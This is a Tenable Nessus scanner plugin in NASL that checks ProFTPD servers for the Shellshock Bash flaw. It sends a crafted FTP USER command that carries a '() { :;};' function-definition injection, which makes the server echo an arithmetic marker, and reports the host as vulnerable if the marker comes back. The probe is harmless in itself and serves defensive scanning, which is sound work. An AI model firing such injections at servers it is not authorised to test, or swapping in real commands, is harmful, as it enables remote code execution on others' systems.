#TRUSTED 1f90fbfd2c623bfb8cd8d6036f1bd87aad1e8c422e5be2aa3231c57b8de7120b9df1f6ab04162d9daf25d1c63e36b1d3a175b8049cffedde2861b360d85651e2c919775e58c66c7b618c175c33ba9e3e697618aff754d298011d8b397a7ed2525643980d0d8aea0aec56e8bbb758e1517fdce13e4f24432ae3ae18d8c09ce058a86fa4c8ebec087d0235f89a81749544581b098f21289f86b7cf9489e63120dab96f06fd9865ffb4691694c430b8b4d2a9fdcb2082b07f66544771ce59409d8e051c77e7f26482131ed0e17d27df8cb7e826cd4c06d382ebf70b100b2cea2e5d7b488d0cb34dfd4eaaa654bcca5080a8056f01b5435bd3836227b2ae4edc118bcefbfdfa2a7ad4e99a6937c48b00904ff4548683f94e5ac2e86a0ad5e4ec32964db3b2234695b7a7810dd95e9cb08aed46564927c039221698a75867fe4704fede936d5fb01c9b16af8a9145e0ca23504d9e9351eab39577549f34aab9977f8744104fffe16d0a7f64451455b27f670e8e75968bb4fef0414a83b06706ceed5ecedec655d7cd113e259b967844746aba6076fb120b8338ef649862fe640a14e130cff3e56d120991f726c2acfe622ba476b21f35df9a1541a051c1da72f15437603fdab1b0fe2dbdd9f15c02b9235f4d0fb58b4dcb04454df1d2bb3a77796d1903ae573f575479d964658eb7c814d3fd4edd085114f20816c7dcbcfcc7c71572
#TRUST-RSA-SHA256 a811fd3f12f12ab68b8a1a00a37bba2c32e0ba15d1c63311db52ece56006a53cc8eedd0b1fec9baff1c0c3c84342e9dcd045336b15cb26bb28f2706f9c0a369463d1e9c9477228de18c0f9babae6ce9e3667970cf29c9a81e27aaef600d55e5dc361327d37540504ac6bb645c53cbdf17511adbe3e3b2af482f9adb8f88bc03ee637554b5459c61a4c6b7f3ff8554b0258178d16b93e6acd872ab90521cbfbe620a326782b5f6e0eb677ac5991a6b55c4d4c048e0b2a95eceed6e9f824b9b6dc90da6d36f89ae0355b7116c6b454e8ff2b05d43879bea2d32f2e5d4be943188867878e214108cefb4e41a629d87b1694653f4b67bdcbcf83b5686e7c763408ab92e163cfa3f50491b67aa8333fefdf8b37e2bcd68b61d902dc87046e8934e277e86e6f78a4bee08e36a6f8fdfa8dccb5ea0988863cdff2e31ccae72224e192098a032e233dafbfb14c2c7361fea7db8184eb7337be09020628d73000053dc849547559e48bf0d728cf0c62f2ba14a8b9b29baa26537823411289ddd9f77fd93ee0be723b7b5106732b6b5bb4c8ee77f00775e9c194c193a27c85cbe80aa425519cb530908afded66b6167452f6f3cdf60b265161528c5528b1cee11563534833db2e39484860170232b552637e290835988e0d27041c75426a7f909e60ad3722da945a2c66d9984d2bb05c060e866064c13b470a5502c3636df856978fe12848
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(77986);
  script_version("1.29");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/01/16");

  script_cve_id("CVE-2014-6271", "CVE-2014-7169");
  script_bugtraq_id(70103, 70137);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/07/28");
  script_xref(name:"CEA-ID", value:"CEA-2019-0240");

  script_name(english:"GNU Bash Environment Variable Handling Code Injection via ProFTPD (Shellshock)");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote FTP server is affected by a remote code execution
vulnerability due to an error in the Bash shell running on the remote
host. A remote, unauthenticated attacker can execute arbitrary code on
the remote host by sending a specially crafted request via the USER
FTP command. The 'mod_exec' module exports the attacker-supplied
username as an environment variable, which is then evaluated by Bash
as code.");
  script_set_attribute(attribute:"see_also", value:"http://www.proftpd.org/docs/contrib/mod_exec.html#ExecEnviron");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:
"Apply the referenced patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-6271");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Qmail SMTP Bash Environment Variable Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2014-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_starttls.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);
  script_timeout(600);

  exit(0);
}

include("byte_func.inc");
include("ftp_func.inc");
include("kerberos_func.inc");
include("ldap_func.inc");
include("nntp_func.inc");
include("rsync.inc");
include("smtp_func.inc");
include("ssl_funcs.inc");
include("telnet2_func.inc");

port = get_ftp_port(default:21);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

function ftp_open(port)
{
  local_var encaps, soc;

  encaps = get_port_transport(port);
  if (encaps > ENCAPS_IP)
  {
    if (get_kb_item("global_settings/disable_test_ssl_based_services"))
      exit(1, "Not testing SSL based services per user config.");
    soc = open_sock_ssl(port, encaps:encaps);
  }
  else soc = open_sock_tcp(port, transport:ENCAPS_IP);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  # Discard banner
  dbg::detailed_log(name:'ftp_func', src:SCRIPT_NAME, lvl:2, msg:"Getting the FTP banner.");
  ftp_recv_line(socket:soc);

  return soc;
}

# Attempt to get the service to echo something back to us, if the
# 'ExecOptions sendStdout' option is set.

echo_injection = '() { :;}; echo "NESSUS-e07ad3ba-$((17 + 12))-59f8d00f4bdf"';
echo_response = 'NESSUS-e07ad3ba-29-59f8d00f4bdf';

socket = ftp_open(port:port);

send(socket:socket, data:"USER " + echo_injection + '\r\n');
res = recv(socket:socket, length:2000, min:2000, timeout:60);

ftp_close(socket:socket);

if (echo_response >< res)
{
  report = NULL;
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to determine that the remote host is vulnerable to the ' +
      '\n' + 'Shellshock vulnerability by evaluating a simple math equation, injected ' +
      '\n' + 'through the ProFTPD service on port ' + port + '. The service allowed injection ' +
      '\n' + "via the '%U' mod_exec 'cookie'." +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else audit(AUDIT_LISTEN_NOT_VULN, "FTP server", port);
